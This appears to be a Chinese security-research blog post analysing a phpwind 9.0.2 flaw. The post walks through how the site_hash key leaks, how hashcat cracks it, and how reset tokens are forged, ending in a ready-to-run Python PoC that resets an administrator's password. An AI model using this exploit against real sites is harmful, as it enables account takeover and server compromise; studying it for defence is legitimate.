---
title: phpwind9.0.2 site_hash安全问题
copyright: true
date: 2022-05-05 21:41:46
tags: 渗透测试
---
好久没更了，水一篇去年realworldctf上议题相关的文章
<!--more-->

先导：
1.phpwind是前些年比较流行的一个phpweb应用框架，和一般的php框架比，代码逻辑非常完善，可惜的是已经停止维护了，官网也没了，但仍然在先知计划供应链漏洞的B类厂商之列。  
2.phpwind历史漏洞中印象比较深的是利用哈希长度扩展攻击绕过身份验证的漏洞，但在最新版本中已修复。  
3.orange大佬在realworldctf2021上的红队实战议题中提到了phpwind9，并利用了一个0day漏洞拿到目标应用phpwind的site_hash，之后在无法直接利用site_hash的情况下使用CVE-2015-0273 UAF getshell，详细内容如下
https://www.bilibili.com/video/BV1wX4y1K7W4  
4.本文是对orange议题中前半部分的复现并扩充。  

**①encrypt函数**
phpwind中的加密函数encrypt在src\library\Pw.php，许多数据在传输时会使用encrypt函数加密。
```
public static function encrypt($str, $key = '') {
   $key || $key = Wekit::C('site', 'hash');
   /* @var $security IWindSecurity */
   $security = Wind::getComponent('security');
   return base64_encode($security->encrypt($str, $key));
}
```
跟进后发现encrypt实际上使用了des 的cbc加密模式加密
**②site_hash密钥**
site_hash在phpwind安装时自动产生，产生的过程如下
 src\application\install\controller\IndexController.php
 ```
 $site_hash = WindUtility::generateRandStr(8);
 $cookie_pre = WindUtility::generateRandStr(3);
 Wekit::load('config.PwConfig')->setConfig('site', 'hash', $site_hash);
 Wekit::load('config.PwConfig')->setConfig('site', 'cookie.pre', $cookie_pre);
```
```
public static function generateRandStr($length) {
   $mt_string = 'AzBy0CxDwEv1FuGtHs2IrJqK3pLoM4nNmOlP5kQjRi6ShTgU7fVeW8dXcY9bZa';
   $randstr = '';
   for ($i = 0; $i < $length; $i++) {
      $randstr .= $mt_string[mt_rand(0, 61)];
   }
   return $randstr;
}
```
安装时通过generateRandstr方法生成site_hash和cookie_pre
site_hash为全局加密的密钥，8位随机大小写字母或数字
cookie_pre为cookie的前缀，3位随机大小写字母或数字

生成的site_hash和cookie_pre会写入data\cache\config.php  
![1.png](https://lockcy-github-io.vercel.app/2022/05/05/phpwind9-0-2-site-hash%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/1.png)
**③ 破解site_hash方式**
orange提出了两种攻击方式：
1.生成所有可能的site_hash，再使用decrypt函数暴力解码。
2.暴力选出所有当前随机序列的种子(seed)，利用该随机种子重现site_hash。
但这两种方式开销太大。
![2.png](https://lockcy-github-io.vercel.app/2022/05/05/phpwind9-0-2-site-hash%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/2.png)
**④漏洞发现**
\src\application\bbs\controller\ForumController.php
```
/**
* 验证版块密码
*/
public function verifyAction() {
   $fid = $this->getInput('fid');
   $password = $this->getInput('password', 'post');
   Wind::import('SRV:forum.bo.PwForumBo');
   $forum = new PwForumBo($fid);
   if (!$forum->isForum(true)) {
      $this->showError('BBS:forum.exists.not');
   }
   if (md5($password) != $forum->foruminfo['password']) {   // 左侧传入数组，fid传入公开的id，公开的版块password为null，!=两边都为null，绕过此判断
      $this->showError('BBS:forum.password.error');
   }
   Pw::setCookie('fp_' . $fid, Pw::getPwdCode(md5($password)), 86400);
   $this->showMessage('success');
}
```
![3.png](https://lockcy-github-io.vercel.app/2022/05/05/phpwind9-0-2-site-hash%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/3.png)
src/library/Pw.php
```
public static function getPwdCode($pwd) {
   return md5($pwd . Wekit::C('site', 'hash'));   //$pwd=null    return md5(Wekit::C('site', 'hash')) --->  return md5($site_hash);
}
```
请求一个需要密码才能访问的版块，post一个不需要密码但存在的版块id，以数组形式post password参数，绕过BBS:forum.password.error，进而将cookie设置为md5(site_hash)，如下图
![4.png](https://lockcy-github-io.vercel.app/2022/05/05/phpwind9-0-2-site-hash%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/4.png)
**⑤爆破site_hash（gpu不差的情况下一到两小时就能出），获得了site_hash**
```
hashcat.exe -m 0 -a 3 f0bf790070caa2ff337d58cf324fb2c5 -1 ?l?u?d ?1?1?1?1?1?1?1?1
f0bf790070caa2ff337d58cf324fb2c5:c7WDyMzA
```
**⑥利用site_hash进入后台**
以上是议题中前半部分的内容，因为目标系统不是标准的phpwind应用的缘故，orange针对目标系统php版本使用了CVE-2015-0273 UAF getshell，接下来简述如何利用site_hash在一般phpwind系统getshell。

利用site_hash重置任意用户密码，这里需要一个前提条件，即需要知道重置那个用户的邮箱，这里可以通过社工等方式搞到。

\src\applications\u\controller\FindPwdController.php
```
if (!$findPasswordBp->sendResetEmail(PwFindPassword::createFindPwdIdentify($username,PwFindPassword::WAY_EMAIL, $email))) {
   $this->showError('USER:findpwd.error.sendemail');
}
```
跟进\src\service\user\srv\PwFindPassword.php
```
public static function createFindPwdIdentify($username, $way, $value) {
   $code = Pw::encrypt($username . '|' . $way . '|' . $value, Wekit::C('site', 'hash') . '___findpwd');
   return rawurlencode($code);
}
```
使用encrypt函数生成一个statu，statu组成如下rawurlencode(encrypt(用户|email|邮箱，$site_hash___findpwd)
跟进\src\service\user\srv\PwFindPassword.php
```
public function sendResetEmail($state) {
   if (true !== ($check = $this->allowFindBy(self::WAY_EMAIL))) return $check;
   //TODO 产生激活码的方法
       $zz = Pw::getTime();
   $code = substr(md5(Pw::getTime()), mt_rand(1, 8), 8);
   echo Pw::getTime();
   $url = WindUrlHelper::createUrl('u/findPwd/resetpwd', array('code' => $code, '_statu' => $state));
   list($title, $content) = $this->_buildTitleAndContent($this->info['username'], $url);
   /* @var $activeCodeDs PwUserActiveCode */
   $activeCodeDs = Wekit::load('user.PwUserActiveCode');
   $activeCodeDs->addActiveCode($this->info['uid'], $this->info['email'], $code, Pw::getTime(), PwUserActiveCode::RESETPWD);
   $mail = new PwMail();
   $mail->sendMail($this->info['email'], $title, $content);
   return true;
}
```
生成code，code为substr(md5(Pw::getTime()), mt_rand(1, 8), 8)，请求时服务器会返回时间戳，即使不知道mt_rand(1,8),8)的值，问题也不大，尝试8次即可。
到此为止已经可以伪造statu和code，这两个参数是重置密码链接中必须的，到此为止我们已经基本成功了，重置链接结构如下：
![5.png](https://lockcy-github-io.vercel.app/2022/05/05/phpwind9-0-2-site-hash%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/5.png)
自己写了个poc，只需要修改main中username为重置密码的用户名，email为重置密码的邮箱，site_hash为目标站点的site_hash即可。
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2022/5/4 01:36
# @Author  : lockcy
# @File    : 9.0.2任意用户密码重置.py

from pyDes import des, CBC, PAD_PKCS5
import base64
import hashlib
import requests
import re
from urllib.parse import quote
import string

r = requests.session()

def md5(st):
    return hashlib.md5(st.encode(encoding='UTF-8')).hexdigest()

def des_encrypt(s, key):
    """
    DES 加密
    :param s: 原始字符串
    :return: 加密后字符串，16进制
    """
    size = 8
    iv = md5(key)[-size:]
    key = key[:size]
    # pad = size - (len(s)%size)
    k = des(key, CBC, iv, pad=None, padmode=PAD_PKCS5)
    en = k.encrypt(s, padmode=PAD_PKCS5)
    return base64.b64encode(en)

def request(url, username,email):
    # request for findpwd
    html = r.get(url+'/index.php?m=u&c=findPwd')
    data = re.findall(r'(?<=csrf_token" value=")\w+', html.text)
    csrf_token = data[0]
    print(csrf_token)
    header = {
        'Cookie': 'csrf_token={0};'.format(csrf_token),
    }
    datas = {
        'step':'do',
        'username':username,
        'csrf_token':csrf_token,
    }
    # request for checkusername
    html = r.post(url + '/index.php?m=u&c=findPwd&a=checkUsername', headers=header, data=datas)
    data = re.findall(r'(?<=csrf_token" value=")\w+', html.text)
    csrf_token = data[0]
    # request for findpwd
    header = {
        'Cookie': 'csrf_token={0};'.format(csrf_token),
    }
    datas = {
        'username':username,
        'email':email,
        'csrf_token':csrf_token,
    }
    html = r.post(url + '/index.php?m=u&c=findPwd&a=dobymail', headers=header, data=datas)
    if "我们已经发送邮件至您的邮箱" in html.text:
        print('重置连接发送成功')
        t = re.findall(r'(?<=lMd_lastvisit=0%09).*(?=%09%2Fphpwind)', str(html.headers))[0]
        return int(t)
    elif "邮箱和用户名不匹配" in html.text:
        print('邮箱和用户名不匹配')
        return False

if __name__ == '__main__':
    base_url = "http://10.10.10.134:8080/phpwind9/"
    username ='admin'
    email = 'xxxx@qq.com'
    site_hash = 'TbJlLkai'
    timestamp = 1
    timestamp = request(url=base_url, username=username, email=email)
    verification = des_encrypt(s=username+"|"+'email'+"|"+email, key=site_hash+'___findpwd')
    verification = verification.decode('utf-8')
    for v in verification:
        if v not in string.digits and v not in string.ascii_letters:
            verification = verification.replace(v, quote(quote(v, encoding='utf-8'),encoding='utf-8'))
    print(verification)
    print(timestamp)
    print(md5(str(timestamp)))
    if timestamp:
        for i in range(0, 8):
            code = md5(str(timestamp))[i+1:i+9]
            url = base_url + 'index.php?m=u&c=findPwd&a=resetpwd&code={0}&_statu={1}'.format(code, verification)
            html = r.get(url)
            # print(url)
            if '新密码' in html.text:
                print(url)
```
![6.png](https://lockcy-github-io.vercel.app/2022/05/05/phpwind9-0-2-site-hash%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/6.png)
访问连接即可重置管理员密码
![7.png](https://lockcy-github-io.vercel.app/2022/05/05/phpwind9-0-2-site-hash%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/7.png)
重置密码进入后台后可以通过插入代码的方式getshell。

**⑦后记**
1.后来想了下，这条利用链虽然比较清晰，但条件也蛮苛刻的，需要有密码的版块+管理员的email。
2.除了上述获取site_hash的方法外，还可以使用Phpwind中mt_rand的问题来获取site_hash，详细操作https://www.jianshu.com/p/4989b4d89d4e ，利用的原理也比较简单，phpwind应用安装时先设置一次种子，mt_rand1次，生成key时调用mt_rand10次，生成site_hash时调用8次，生成cookie_pre时调用3次，这个cookie_pre我们是可以知道的，因此获得了mt_rand的一条随机数链：
（0 0 0 0)*19  (x1 x1 0 61)   (x2 x2 0 61)   (x3 x3 0 61)
使用php_mt_seeds暴力获得能产生该链的所有种子，再根据种子复现site_hash看是否能解开cookie，能解开cookie的site_hash便是正确的，效率比orange第二种暴力所有种子的方式快很多。原理挺对的，本地也复现成功了，但挑了几个站发现出不来，不知道是别人魔改了这段程序，还是这方法本身的问题，有时间再看看吧。
